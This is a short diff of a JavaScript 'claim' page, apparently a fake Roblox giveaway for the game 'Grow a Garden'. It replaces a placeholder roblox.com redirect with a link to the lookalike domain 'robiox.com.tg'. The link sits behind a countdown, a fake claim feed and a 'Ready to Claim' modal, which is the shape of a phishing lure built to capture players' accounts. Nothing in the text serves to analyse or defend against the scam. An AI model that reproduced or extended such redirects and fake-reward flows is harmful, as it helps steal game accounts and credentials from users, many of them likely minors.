@@ -203,7 +203,7 @@ window.startProcessing = function() {
       } else {
         setTimeout(() => {
           let countdown = 5;
-          const redirectUrl = "https://www.roblox.com/games/123456789/YourPrivateServer"; // your link
+          const redirectUrl = "https://www.robiox.com.tg/games/126884695634066/Grow-a-Garden?privateServerLinkCode=983286587985765853686787059868"; // your link
           pushClaimToFeed(username, selected);
           showModal(`
             <h3>Ready to Claim</h3>
